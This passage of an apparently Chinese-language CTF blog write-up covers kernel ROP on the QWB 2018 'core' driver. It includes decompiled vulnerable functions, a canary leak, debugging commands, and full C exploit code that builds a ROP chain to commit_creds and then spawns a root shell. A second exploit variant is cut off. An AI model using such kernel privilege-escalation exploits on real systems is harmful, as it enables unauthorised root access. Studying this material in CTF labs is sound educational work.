class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内核时返回用户态</p><ul><li><code>swapgs</code>指令恢复用户态 GS 寄存器</li><li><code>sysretq</code>或者<code>iretq</code>恢复到用户空间</li></ul><p>返回用户态前，内核栈板子</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">↓      提权操作的rop</span><br><span class="line">    swapgs</span><br><span class="line">    iretq</span><br><span class="line">    user_shell_addr</span><br><span class="line">    user_cs</span><br><span class="line">    user_eflags</span><br><span class="line">    user_sp</span><br><span class="line">    user_ss</span><br></pre></td></tr></table></figure><h2 id="强网杯-2018-core"><a href="#强网杯-2018-core" class="headerlink" title="强网杯 2018 - core"></a>强网杯 2018 - core</h2><p>链接：<a href="https://pan.baidu.com/s/13_X5ZqLYyym2OPithQMeCQ">https://pan.baidu.com/s/13_X5ZqLYyym2OPithQMeCQ</a><br>提取码：w9xj</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~/k/Q/give_to_player&gt; checksec core.ko</span><br><span class="line">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/core.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure><h3 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h3><p>看下init脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat /proc/kallsyms &gt;/tmp/kallsyms #可以泄露commit_creds，prepare_kernel_cred 的函数的地址</span><br><span class="line">echo 1 &gt;/proc/sys/kernel/kptr_restrict#通过cat /proc/kallsyms查看函数地址时都显示0</span><br><span class="line">echo 1 &gt;/proc/sys/kernel/dmesg_restrict#不能用dmesg查看日志</span><br></pre></td></tr></table></figure><h3 id="启动脚本"><a href="#启动脚本" class="headerlink" title="启动脚本"></a>启动脚本</h3><p>只开启了kaslr</p><h3 id="core-ko"><a href="#core-ko" class="headerlink" title="core.ko"></a>core.ko</h3><p>创建了个虚拟文件节点来和内核通信</p><p><code>struct proc_dir_entry *proc_create(const char *name, umode_t mode, struct proc_dir_entry *parent, const struct file_operations *proc_fops);</code>函数可以快速创建一个文件节点</p><ul><li><code>name</code>：文件名</li><li><code>mode</code>：文件读写执行权限</li><li><code>parent</code>：该文件挂载的procfs节点，若为NULL则自动挂载到<code>/proc</code>目录下</li><li><code>proc_ops</code>：该文件的proc_ops结构体</li></ul><p><code>remove_proc_entry(const char *, struct proc_dir_entry *)</code>用以注销此前创建的文件</p><ul><li>第一个参数为文件名</li><li>第二个参数为其挂载的节点，若为NULL则默认为<code>/proc</code>目录</li></ul><p>这里的结构体甚至函数，不同内核版本可能会不一样，最好还是去当前内核版本源码里看一下 <a href="https://elixir.bootlin.com/linux/v4.15.8/source/include/linux/fs.h#L1692">https://elixir.bootlin.com/linux/v4.15.8/source/include/linux/fs.h#L1692</a></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span></span><br><span class="line">    <span class="type">loff_t</span> (*llseek) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*read) (<span class="keyword">struct</span> file *, <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="type">ssize_t</span> (*write) (<span class="keyword">struct</span> file *, <span class="type">const</span> <span class="type">char</span> __user *, <span class="type">size_t</span>, <span class="type">loff_t</span> *);</span><br><span class="line">    <span class="type">ssize_t</span> (*read_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">    <span class="type">ssize_t</span> (*write_iter) (<span class="keyword">struct</span> kiocb *, <span class="keyword">struct</span> iov_iter *);</span><br><span class="line">    <span class="type">int</span> (*iterate) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">    <span class="type">int</span> (*iterate_shared) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> dir_context *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">int</span> <span class="params">(*poll)</span> <span class="params">(<span class="keyword">struct</span> file *, <span class="keyword">struct</span> poll_table_struct *)</span>;</span><br><span class="line">    <span class="type">long</span> (*unlocked_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">long</span> (*compat_ioctl) (<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">int</span>, <span class="type">unsigned</span> <span class="type">long</span>);</span><br><span class="line">    <span class="type">int</span> (*mmap) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> vm_area_struct *);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> mmap_supported_flags;</span><br><span class="line">    <span class="type">int</span> (*open) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="type">int</span> (*flush) (<span class="keyword">struct</span> file *, <span class="type">fl_owner_t</span> id);</span><br><span class="line">    <span class="type">int</span> (*release) (<span class="keyword">struct</span> inode *, <span class="keyword">struct</span> file *);</span><br><span class="line">    <span class="type">int</span> (*fsync) (<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="type">loff_t</span>, <span class="type">int</span> datasync);</span><br><span class="line">    <span class="type">int</span> (*fasync) (<span class="type">int</span>, <span class="keyword">struct</span> file *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*lock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*sendpage) (<span class="keyword">struct</span> file *, <span class="keyword">struct</span> page *, <span class="type">int</span>, <span class="type">size_t</span>, <span class="type">loff_t</span> *, <span class="type">int</span>);</span><br><span class="line">    <span class="type">unsigned</span> <span class="title function_">long</span> <span class="params">(*get_unmapped_area)</span><span class="params">(<span class="keyword">struct</span> file *, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>, <span class="type">unsigned</span> <span class="type">long</span>)</span>;</span><br><span class="line">    <span class="type">int</span> (*check_flags)(<span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*flock) (<span class="keyword">struct</span> file *, <span class="type">int</span>, <span class="keyword">struct</span> file_lock *);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_write)(<span class="keyword">struct</span> pipe_inode_info *, <span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">ssize_t</span> (*splice_read)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span> *, <span class="keyword">struct</span> pipe_inode_info *, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*setlease)(<span class="keyword">struct</span> file *, <span class="type">long</span>, <span class="keyword">struct</span> file_lock **, <span class="type">void</span> **);</span><br><span class="line">    <span class="type">long</span> (*fallocate)(<span class="keyword">struct</span> file *file, <span class="type">int</span> mode, <span class="type">loff_t</span> offset,</span><br><span class="line">              <span class="type">loff_t</span> len);</span><br><span class="line">    <span class="type">void</span> (*show_fdinfo)(<span class="keyword">struct</span> seq_file *m, <span class="keyword">struct</span> file *f);</span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> CONFIG_MMU</span></span><br><span class="line">    <span class="type">unsigned</span> (*mmap_capabilities)(<span class="keyword">struct</span> file *);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">ssize_t</span> (*copy_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *,</span><br><span class="line">            <span class="type">loff_t</span>, <span class="type">size_t</span>, <span class="type">unsigned</span> <span class="type">int</span>);</span><br><span class="line">    <span class="type">int</span> (*clone_file_range)(<span class="keyword">struct</span> file *, <span class="type">loff_t</span>, <span class="keyword">struct</span> file *, <span class="type">loff_t</span>,</span><br><span class="line">            u64);</span><br><span class="line">    <span class="type">ssize_t</span> (*dedupe_file_range)(<span class="keyword">struct</span> file *, u64, u64, <span class="keyword">struct</span> file *,</span><br><span class="line">            u64);</span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><p>题目里重构了下write，unlocked_ioctl，release分别对用用户态的write，ioctl，close函数</p><p>ioctl函数里的case 0x6677889A，存在溢出问题</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_copy_func</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="type">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><p>判断a1 &gt; 63时用的是__int64，qmemcpy(v2, &amp;name, (unsigned __int16)a1);时用的是unsigned __int16,用一个低16bit较大的负数，如(0xffffffffffff0000|(0x100))可以实现内核栈溢出</p><p>这里name可以通过write控制</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(&amp;name, a2, a3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">unsigned</span> <span class="type">int</span>)a3;</span><br><span class="line">  printk(&amp;unk_230);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">4294967282LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在rop只需要canary和commit_creds(prepare_kernel_cred(NULL))函数地址</p><p>core_read中的off可以通过case 0x6677889C控制，可以把canary读到我们用户态得变量里，泄露canary，函数地址可以通过&#x2F;tmp&#x2F;kallsyms来泄露</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">core_read</span><span class="params">(__int64 a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;v5[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于只开了kaslr，这道题方法还是蛮多的</p><p>从这道题来看，感觉内核态canary感觉按照rsp算比较准，rsp+0x40的位置</p><p><img src="/2023/08/14/kernel-rop/image-20230816144106041.png" alt="image-20230816144106041"></p><h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>关掉kaslr调试</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">sudo gdb -q \</span><br><span class="line">      -ex &quot;file vmlinux&quot;\</span><br><span class="line">    -ex &quot;add-symbol-file core.ko 0xffffffffc0000000 -s .data 0xffffffffc0002000 -s .bss 0xffffffffc0002400&quot;\</span><br><span class="line">    -ex &quot;target remote localhost:1234&quot;\</span><br><span class="line">    -ex &quot;b *(0x159+0xffffffffc0000000)&quot;</span><br><span class="line"><span class="meta prompt_">    # </span><span class="language-bash">-ex <span class="string">&quot;b core_ioctl&quot;</span></span> </span><br></pre></td></tr></table></figure><h3 id="commit-creds-amp-init-cred"><a href="#commit-creds-amp-init-cred" class="headerlink" title="commit_creds(&amp;init_cred)"></a>commit_creds(&amp;init_cred)</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span class="line">  <span class="keyword">if</span> (!(prepare_kernel_cred &amp; commit_creds)) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">spawn_shell</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!getuid()) &#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]spawn shell error!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span> &#123;</span><br><span class="line">  __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">          <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">          <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">          <span class="string">&quot;pop user_rflags;&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open /proc/core error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  find_symbols();</span><br><span class="line">  init_cred = <span class="number">0xFFFFFFFF8223D1A0</span> +bias;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889C</span>, <span class="number">0x40</span>);</span><br><span class="line">  <span class="type">size_t</span> canary[<span class="number">0x40</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889B</span>, canary);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+]canary: %p\n&quot;</span>, canary[<span class="number">0</span>]);</span><br><span class="line">  <span class="type">size_t</span> rop[<span class="number">0x1000</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="type">int</span> i;</span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    rop[i] = canary[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    0xffffffff81000b2f: pop rdi; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81a012da: swapgs; popfq; ret;</span></span><br><span class="line"><span class="comment">    0xffffffff81050ac2: iretq; ret;</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">  save_status();</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81000b2f</span> + bias; <span class="comment">// pop rdi; ret;</span></span><br><span class="line">  rop[i++] = init_cred;</span><br><span class="line">  rop[i++] = commit_creds;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81a012da</span> + bias; <span class="comment">// swapgs; popfq; ret;</span></span><br><span class="line">  rop[i++] = <span class="number">0</span>;</span><br><span class="line">  rop[i++] = <span class="number">0xffffffff81050ac2</span>+bias;  <span class="comment">// iretq; ret;</span></span><br><span class="line">  rop[i++] = (<span class="type">size_t</span>)spawn_shell; <span class="comment">// rip</span></span><br><span class="line">  rop[i++] = user_cs;</span><br><span class="line">  rop[i++] = user_rflags;</span><br><span class="line">  rop[i++] = user_sp;</span><br><span class="line">  rop[i++] = user_ss;</span><br><span class="line">  write(fd, rop, <span class="number">0x800</span>);</span><br><span class="line">  ioctl(fd, <span class="number">0x6677889A</span>, <span class="number">0xffffffffffff0000</span> | (<span class="number">0x100</span>));</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/14/kernel-rop/image-20230816162343753.png" alt="image-20230816162343753"></p><p><img src="/2023/08/14/kernel-rop/image-20230816161321011.png" alt="image-20230816161321011"></p><h3 id="commit-creds-prepare-kernel-cred-NULL"><a href="#commit-creds-prepare-kernel-cred-NULL" class="headerlink" title="commit_creds(prepare_kernel_cred(NULL))"></a>commit_creds(prepare_kernel_cred(NULL))</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stddef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="comment">/*&gt;&gt;&gt; from pwn import *</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; vmlinux = ELF(&quot;./vmlinux&quot;)</span></span><br><span class="line"><span class="comment">[*] &#x27;/home/grxer/kernel-env/QWB2018-core/give_to_player/vmlinux&#x27;</span></span><br><span class="line"><span class="comment">    Arch:     amd64-64-little</span></span><br><span class="line"><span class="comment">    Version:  4.15.8</span></span><br><span class="line"><span class="comment">    RELRO:    No RELRO</span></span><br><span class="line"><span class="comment">    Stack:    Canary found</span></span><br><span class="line"><span class="comment">    NX:       NX disabled</span></span><br><span class="line"><span class="comment">    PIE:      No PIE (0xffffffff81000000)</span></span><br><span class="line"><span class="comment">    RWX:      Has RWX segments</span></span><br><span class="line"><span class="comment">&gt;&gt;&gt; hex(vmlinux.sym[&#x27;init_cred&#x27;])</span></span><br><span class="line"><span class="comment">&#x27;0xFFFFFFFF8223D1A0&#x27;*/</span></span><br><span class="line"><span class="type">size_t</span> init_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>, prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> vmlinux_base = <span class="number">0</span>, bias;</span><br><span class="line"><span class="type">size_t</span> raw_base = <span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="type">size_t</span> <span class="title function_">find_symbols</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *kallsyms_fd = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (kallsyms_fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]open kallsyms error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">0x30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">  <span class="keyword">while</span> (fgets(buf, <span class="number">0x30</span>, kallsyms_fd)) &#123;</span><br><span class="line">    <span class="keyword">if</span> (commit_creds &amp; prepare_kernel_cred)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;commit_creds&quot;</span>) &amp;&amp; !commit_creds) &#123;</span><br><span class="line">      <span class="comment">/* puts(buf); */</span></span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="comment">/* printf(&quot;hex: %s\n&quot;, hex); */</span></span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;commit_creds);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;commit_creds addr: %p\n&quot;</span>, commit_creds);</span><br><span class="line">      vmlinux_base = commit_creds - <span class="number">0x9c8e0</span>;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;vmlinux_base addr: %p\n&quot;</span>, vmlinux_base);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>) &amp;&amp; !prepare_kernel_cred) &#123;</span><br><span class="line">      <span class="type">char</span> hex[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">      <span class="built_in">strncpy</span>(hex, buf, <span class="number">16</span>);</span><br><span class="line">      <span class="built_in">sscanf</span>(hex, <span class="string">&quot;%zx&quot;</span>, &amp;prepare_kernel_cred);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">      assert(vmlinux_base == (prepare_kernel_cred - <span class="number">0x9cce0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  bias = vmlinux_base - raw_base;</span><br><span 